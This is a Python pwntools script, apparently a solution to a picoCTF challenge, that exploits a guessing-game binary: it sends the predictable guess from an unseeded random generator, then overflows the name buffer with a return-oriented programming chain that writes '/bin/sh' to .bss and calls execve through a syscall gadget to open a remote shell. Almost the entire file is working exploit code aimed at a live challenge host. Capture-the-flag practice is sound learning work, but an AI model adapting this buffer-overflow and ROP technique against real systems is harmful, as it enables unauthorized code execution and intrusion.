# Solution
# We are able to gain control of the return pointer through a buffer overflow
# Since the stack is non-executable, looks like we will use ROP
# There is a syscall in there, so we should be able to give it /bin/sh, then syscall exec

from pwn import *

HOST = 'jupiter.challenges.picoctf.org'
PORT = 51462

# Useful gadgets
g_pop_rax = p64(0x4163f4)
g_pop_rdi = p64(0x400696)
g_pop_rdx = p64(0x44a6b5)
g_mov_ptr_rdi_rdx = p64(0x436393)
g_syscall = p64(0x40137c)

# Scratch space
bss = p64(0x6ba0e0)

# Variables
execve = p64(59)
s_bin_sh = b'/bin/sh\x00'

def main():
  context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
  proc = remote(HOST, PORT)
  #proc = process('./vuln')
  #gdb.attach(proc)
  #sleep(3)

  padding = b'A' * 0x70
  rbp = b'A' * 8

  payload = b''.join([
    padding,
    rbp,
    g_pop_rdi,
    bss,
    g_pop_rdx,
    s_bin_sh,
    g_mov_ptr_rdi_rdx,
    g_pop_rdx,
    p64(0),
    g_pop_rdi,
    bss,
    g_pop_rax,
    execve,
    g_syscall
  ])

  proc.sendlineafter(b'What number would you like to guess?', b'84') # Since rand is never seeded, it will always be this
  proc.sendlineafter(b'Name?', payload)

  # Should give you a shell to interact with
  proc.interactive()

if __name__ == '__main__':
  main()
